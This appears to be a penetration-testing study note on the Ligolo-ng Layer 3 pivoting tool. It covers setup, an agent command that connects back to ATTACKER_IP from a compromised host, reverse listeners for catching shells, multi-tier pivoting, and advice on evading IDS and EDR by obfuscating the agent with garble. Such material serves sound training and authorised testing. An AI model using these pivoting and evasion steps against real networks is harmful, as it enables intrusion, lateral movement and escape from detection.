---
tags: [tools, network, pivoting, tunneling, vapt]
difficulty: advanced
module: "59 - Complete Tools Reference"
topic: "59.55 Ligolo-ng Layer 3 Pivot Tool"
---

# 59.55 Ligolo-ng Layer 3 Pivot Tool

## Overview and Core Mechanics

Ligolo-ng is an advanced, modern tunneling/pivoting tool written in Go that represents a paradigm shift from traditional proxy-based tools like Chisel or Proxychains. Instead of creating a SOCKS proxy that requires tool-by-tool configuration (and notoriously drops UDP and ICMP traffic), Ligolo-ng operates at **Layer 3 (Network Layer)** of the OSI model using a `tun` (network tunnel) interface.

This means that once Ligolo-ng is established, your attacker machine acts as if it is physically plugged into the compromised internal network. You do not need `proxychains`. You do not need to alter your scanning commands. Nmap SYN scans (`-sS`), OS detection (`-O`), ICMP pings, and all UDP tools work natively and transparently.

The architecture involves a Server (proxy/listener) running on the attacker machine, which creates a virtual network interface (`ligolo`), and an Agent (client) running on the compromised pivot host. The Agent connects back to the Server using a mutually authenticated TLS connection, encapsulating raw IP packets and routing them between the attacker's virtual interface and the target network.

## Visual Architecture: Layer 3 TUN Routing

```text
+-------------------------------------------------------------------+
|                     ATTACKER MACHINE                              |
|                                                                   |
|  +----------------+                 +--------------------------+  |
|  | Standard Tools |                 |   Ligolo-ng Server       |  |
|  | Nmap (SYN/UDP) |   IP Packets    |   (Proxy Listener)       |  |
|  | Metasploit     |---------------->|                          |  |
|  | Ping           |                 |  Listens on TCP 11601    |  |
|  +----------------+                 +--------------------------+  |
|          ^                                      |                 |
|          | OS Routing Table                     | MTLS Encrypted  |
|          v                                      | Tunnel          |
|  +----------------+                             |                 |
|  | TUN Interface  |                             |                 |
|  | (ligolo)       |<============================+                 |
|  +----------------+                                               |
+-------------------------------------------------------------------+
                                  |
                                  |
+-------------------------------------------------------------------+
|                     COMPROMISED HOST (PIVOT)                      |
|                                                                   |
|  +--------------------------+                                     |
|  |   Ligolo-ng Agent        |                                     |
|  |                          |                                     |
|  | Connects to Attacker IP  |                                     |
|  +--------------------------+                                     |
|               |                                                   |
|               v                                                   |
|  +--------------------------+     Raw packets injected to network |
|  |  Physical Interface      |====================================> [Internal Network]
|  |  (eth1: 10.10.0.50)      |                                      [10.10.0.0/24]
|  +--------------------------+                                     |
+-------------------------------------------------------------------+
```

## Detailed Installation and Interface Setup

Because Ligolo-ng manipulates routing tables and creates virtual network interfaces, the initial setup on the attacker machine requires `root` privileges.

### 1. Download Binaries
Download both the `proxy` (Server) and `agent` (Client) binaries from the official GitHub releases.
```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_proxy_0.5.1_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.1/ligolo-ng_agent_0.5.1_linux_amd64.tar.gz
# Extract both
```

### 2. Configure the Attacker Interface (Mandatory)
Before running the Server, you must create the TUN interface that Ligolo-ng will use to inject packets.
```bash
# Create the interface named 'ligolo'
sudo ip tuntap add user [your_username] mode tun ligolo

# Bring the interface up
sudo ip link set ligolo up
```

## Syntax and Operational Workflow

Ligolo-ng workflow requires actions on both the Attacker and the Target.

### Step 1: Start the Server (Attacker)
The proxy creates an interactive console, similar to Metasploit.
```bash
./proxy -selfcert
```
*Analysis:* The `-selfcert` flag automatically generates TLS certificates for the connection. By default, it listens on port `11601`. You can change this using `-l :PORT`.

### Step 2: Execute the Agent (Target)
Transfer the `agent` binary to the compromised machine.
```bash
./agent -connect ATTACKER_IP:11601 -ignore-cert
```
*Analysis:* The `-ignore-cert` is required if you used `-selfcert` on the proxy. Once connected, the Proxy console on the attacker machine will show a new session.

### Step 3: Select Session and Start Tunnel (Attacker)
In the Ligolo-ng Proxy console:
```text
ligolo-ng » session
? Specify a session : 1 - root@COMPROMISED_HOST - 10.10.10.50
ligolo-ng » start
[INFO] Starting tunnel to session 1
```

### Step 4: Configure OS Routing (Attacker)
This is the magic step. The tunnel is active, but your attacker machine doesn't know to send traffic for the internal network through the `ligolo` interface. You must add an IP route.

Assuming the internal network you want to pivot into is `10.10.0.0/24`:
```bash
# In a separate terminal on the attacker machine:
sudo ip route add 10.10.0.0/24 dev ligolo
```
*Analysis:* This tells the Linux kernel: "Any packet destined for the 10.10.0.0/24 subnet should be sent out via the `ligolo` TUN interface."

**You are now fully pivoted.** You can ping internal IPs, run `nmap -sS`, run Responder, or access internal web services directly in your browser without proxy settings.

## Advanced Techniques and Features

### Reverse Port Forwarding (Listener Relaying)
Sometimes you need to catch a reverse shell *from* an internal machine deep in the network back to your attacker machine. Ligolo-ng handles this elegantly via listener forwarding.

In the Ligolo-ng Proxy console:
```text
ligolo-ng » listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
```
*Analysis:* This opens port 4444 on the *Agent* (the compromised target). Any inbound TCP connection to port 4444 on the target will be tunnelled back to your attacker machine on `127.0.0.1:4444`. Set up a Netcat listener locally, and you can catch shells from the deep internal network.

### Double Pivoting (Multi-Tier Architecture)
Ligolo-ng supports multiple agents connecting to the same proxy, making complex multi-tier pivoting seamless.

1. Pivot into Network A (10.10.0.0/24) via Agent 1.
2. Compromise a host in Network A that has access to Network B (10.20.0.0/24).
3. Transfer a new Agent to the Host in Network A.
4. Execute the new Agent, connecting back to the Attacker IP. (Because routing is configured, the Agent in Network A can reach your Attacker IP directly).
5. In the Proxy console, select `session 2`, type `start`.
6. Add the new route: `sudo ip route add 10.20.0.0/24 dev ligolo`.

### Local Port Forwarding
If you don't want to manipulate the routing table for an entire subnet, you can forward single ports, similar to Chisel.
```text
ligolo-ng » forward_add --local 0.0.0.0:8080 --remote 10.10.0.5:80
```
Navigating to `http://localhost:8080` will hit `10.10.0.5:80`.

## Defensive Evasion and Considerations

1.  **Stealthier than SOCKS:** Because Ligolo-ng operates at Layer 3, tools don't exhibit "proxy-like" behavior. Proxychains often leaks DNS or creates predictable TCP connection patterns. Ligolo-ng traffic looks like normal OS routing, making client-side detection tools on the attacker machine irrelevant to the defender.
2.  **Encrypted Transport:** The tunnel between the Agent and Proxy is heavily encrypted using mTLS. Network IDS looking for cleartext reverse shells will be blind to the traffic inside the tunnel.
3.  **Agent Execution:** The execution of the Agent binary is the weakest link. EDR solutions may flag the `agent.exe` binary. Since it's written in Go, obfuscation tools like `garble` can be used to compile the agent from source to bypass static signatures.

## Troubleshooting Common Issues

*   **"Cannot start tunnel: Interface not configured":** You forgot to run the `sudo ip tuntap add...` command on the attacker machine before starting the proxy.
*   **Traffic not reaching the target (ICMP works, but TCP fails):** This is often an MTU (Maximum Transmission Unit) issue. The encapsulated packets are too large and being dropped. Lower the MTU of your `ligolo` interface.
    ```bash
    sudo ip link set dev ligolo mtu 1300
    ```
*   **Agent cannot connect back:** Ensure the proxy listener port (default 11601) is allowed through the attacker's local firewall (e.g., UFW or iptables).
*   **Can't reach the internet while tunnel is active:** If you accidentally added a default route (`0.0.0.0/0`) to the `ligolo` interface, all your internet traffic is trying to go through the target. Delete the route and specify only the target subnet.

## Chaining Opportunities

Ligolo-ng is the ultimate enabler for all other tools in a segmented environment.

1.  **Exploit -> Ligolo-ng:** Establish a foothold, deploy the agent, and map the internal network.
2.  **Ligolo-ng -> [[02 - Nmap Network Mapper]]:** Run full SYN, UDP, and OS detection scans against internal networks flawlessly, something Chisel cannot do.
3.  **Ligolo-ng -> [[43 - Responder and LLMNR Poisoning]]:** Because Ligolo supports UDP multicast (with specific configurations), you can run Responder on your attacker machine and poison requests happening in the internal subnets.
4.  **Ligolo-ng -> [[17 - BloodHound Active Directory Domain Path Enumeration]]:** Run standard AD collectors directly from your Linux machine over the tunnel without needing to drop bulky Windows binaries onto the pivot host.

## Related Notes
*   [[54 - Chisel TCP Tunneling over HTTP]]
*   [[22 - Proxychains and Proxy Configurations]]
*   [[02 - Nmap Network Mapper]]
*   [[42 - Lateral Movement Techniques]]
*   [[31 - Traffic Encapsulation and Encryption]]
